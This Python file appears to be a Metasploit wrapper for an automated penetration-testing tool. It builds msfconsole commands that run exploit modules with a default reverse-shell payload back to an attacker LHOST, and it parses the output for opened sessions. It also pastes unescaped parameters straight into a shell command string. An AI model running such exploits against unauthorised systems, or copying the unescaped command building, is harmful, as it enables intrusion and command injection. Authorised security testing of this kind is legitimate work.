"""
Metasploit Tool Wrapper
Exploit framework for vulnerability validation
"""

from .base import BaseTool


class MetasploitTool(BaseTool):
    """
    Metasploit Framework wrapper via msfconsole -x (resource script mode)

    Supports:
    - Running a single exploit module non-interactively
    - Configuring RHOSTS, RPORT, PAYLOAD, LHOST, LPORT
    - Arbitrary extra module options via the "options" dict
    - Reverse shell / bind shell payloads

    Note: requires msfconsole on PATH and a reachable LHOST for reverse payloads.
    """

    def __init__(self):
        super().__init__(
            name="metasploit",
            command="msfconsole",
            default_timeout=120,
            requires_approval=True,   # Actively exploits — always requires approval
            is_loud=True
        )

    def build_command(self, **kwargs) -> str:
        """
        Build msfconsole resource-script command from parameters

        Args:
            exploit:  Module path (e.g. "exploit/unix/ftp/vsftpd_234_backdoor")
            target:   Target IP address (RHOSTS)
            port:     Target port (RPORT)
            payload:  Payload module (default "generic/shell_reverse_tcp")
            lhost:    Attacker IP for reverse connections
            lport:    Attacker port for reverse connections (default 4444)
            options:  Dict of additional module options {"VERBOSE": "true", ...}
        """
        exploit = kwargs.get("exploit", "")
        target = kwargs.get("target", "")
        port = kwargs.get("port", 0)
        payload = kwargs.get("payload", "generic/shell_reverse_tcp")
        lhost = kwargs.get("lhost", "")
        lport = kwargs.get("lport", 4444)
        options = kwargs.get("options", {})

        # Build the msfconsole resource script as a single -x string.
        # Each command separated by semicolons runs sequentially.
        commands = [
            f"use {exploit}",
            f"set RHOSTS {target}",
            f"set PAYLOAD {payload}",
            f"set LHOST {lhost}",
            f"set LPORT {lport}",
        ]

        if port and int(port) > 0:
            commands.append(f"set RPORT {port}")

        # Additional module options
        for key, value in options.items():
            commands.append(f"set {key} {value}")

        commands += ["run", "exit -y"]

        resource_script = "; ".join(commands)

        return f'msfconsole -q -x "{resource_script}"'

    def parse_output(self, output: str) -> dict:
        """
        Parse msfconsole output for session/exploit results

        Returns:
            dict with:
                - session_opened: Whether a session was obtained
                - session_id: Session ID if opened
                - session_type: shell / meterpreter
                - exploit_result: Brief description of outcome
                - errors: Any error lines from msfconsole
        """
        parsed = {
            "session_opened": False,
            "session_id": 0,
            "session_type": "",
            "exploit_result": "No session obtained",
            "errors": [],
        }

        if not output:
            return parsed

        for line in output.splitlines():
            line_stripped = line.strip()

            # Session opened indicator
            # e.g. "[*] Command shell session 1 opened (attacker:4444 -> target:58230)"
            if "session" in line_stripped.lower() and "opened" in line_stripped.lower():
                parsed["session_opened"] = True
                parsed["exploit_result"] = line_stripped

                # Extract session ID
                try:
                    parts = line_stripped.lower().split("session")
                    session_part = parts[1].strip().split()[0]
                    parsed["session_id"] = int(session_part)
                except (IndexError, ValueError):
                    pass

                # Classify session type
                if "meterpreter" in line_stripped.lower():
                    parsed["session_type"] = "meterpreter"
                elif "shell" in line_stripped.lower():
                    parsed["session_type"] = "shell"

            # Exploit completion without session
            elif "exploit completed" in line_stripped.lower() and not parsed["session_opened"]:
                parsed["exploit_result"] = line_stripped

            # Error indicators
            elif any(indicator in line_stripped.lower() for indicator in [
                "[-]", "exploit failed", "no session was created",
                "connection refused", "timed out",
            ]):
                parsed["errors"].append(line_stripped)

        return parsed

    def validate_params(self, **kwargs) -> tuple[bool, str]:
        """Validate metasploit parameters"""
        if not kwargs.get("exploit"):
            return False, "Exploit module path is required"

        if not kwargs.get("target"):
            return False, "Target IP is required"

        if not kwargs.get("lhost"):
            return False, "LHOST (attacker IP) is required for reverse payloads"

        lport = kwargs.get("lport", 4444)
        if not (1 <= int(lport) <= 65535):
            return False, "LPORT must be between 1 and 65535"

        return True, ""
